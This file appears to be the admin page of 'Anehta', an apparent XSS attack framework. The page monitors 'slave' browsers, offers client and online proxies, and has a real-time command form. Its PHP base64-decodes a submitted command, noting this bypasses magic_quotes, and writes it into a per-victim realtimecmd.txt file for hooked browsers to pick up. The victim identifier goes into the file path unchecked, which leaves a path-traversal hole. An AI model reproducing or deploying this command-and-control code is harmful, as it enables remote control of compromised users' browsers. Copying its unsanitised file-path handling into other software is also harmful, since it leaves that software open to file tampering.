<html><meta http-equiv=content-type content="text/html; charset=utf-8">
	<head>
		<title>
			Anehta!
		</title>
	  <script src="../library/anehta.js" ></script>
	  <script src="../library/jQuery.js" ></script>
	  <link rel="stylesheet" type="text/css" href="css/style.css" />
  </head>
	<body>
		
<div style="float:top;">
Anehta!
</div>

<ul class="basictab">
<img style="float:top;" src="http://lh4.ggpht.com/_ThbrMnDwAq0/R4WoEfOZB_I/AAAAAAAAAjo/N4MudY1_u9Q/s800/CARR3CY5.jpg" />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<li class="selected"><a href="../server/admin.php">Home</a></li>
<li><a href="../slave/index.php">Slave Monitor</a></li>
<li><a onclick="javascript: showRTCMDform();" href="#">RealTime CMD</a>
<script>
		function showRTCMDform(){
			document.getElementById("realcmd").style.visibility = "visible";
		}
</script>	
</li>
<li><a href="../server/clientproxy.php">Client Proxy</a></li>
<li><a href="../tools/glype/index.php">Online Proxy</a></li>
<li><a href="../server/config.php">Configure</a></li>
<li><a href="../server/help.php">Help</a></li>
</ul>


<div class="wireframemenu" style="float:left;">
<ul>
<li><a href="">Anehta</a></li>
<li><a href="">Anehta</a></li>
<li><a href="">Anehta</a></li>
</ul>
</div>

<iframe style="border: 1px solid #ccc; padding: 0; margin: 0 0 0 15px; float: left; width: 600px; height: 400px;" scrolling="yes" src="../slave/index.php"></iframe>


<div id="realcmd" style="visibility: hidden;">
		实时命令控制:
		<form name="realcmd" action="<?php $_SERVER['PHP_SELF']; ?>" method="post" onsubmit="return encodeCmd(this);">
			<textarea id="cmd" name="cmd" style="border: 1px solid #ccc; padding: 0; margin: 0 0 0 15px; float: left; width: 600px; height: 400px;" cols=40 rows=6 ></textarea>
			<script>
			  function encodeCmd(f){
			  	// base64 encode cmd to bypass magic_quotes on
			  	document.getElementsByTagName('textarea')[0].value = anehta.crypto.base64Encode(document.getElementsByTagName('textarea')[0].value);
			  	f.submit();
			  }	
			</script>
			<p>
				WaterMark: <input type=text id="slave" name="slave" value="" />
			  <input type=submit value="FVCK!" />
		  </p>
		</form>
</div>

	Configure Your Anehta:<br />
	<iframe width=500 height=500 src="config.php" ></iframe>  
	<br />
	<iframe width=800 height=700 src="../tools/glype/index.php" ></iframe>
	  
	<br />
		
		
	</body>
	
</html>

<?php
// 管理后台

if (!empty($_POST["cmd"])){
  $realtime_cmd = base64_decode($_POST["cmd"]);
  $slavewatermark = $_POST["slave"]; 
  
  $fp = fopen("../slave/$slavewatermark/realtimecmd.txt", "w+");

  fwrite($fp, urldecode($realtime_cmd));

  fclose($fp);
}

?>

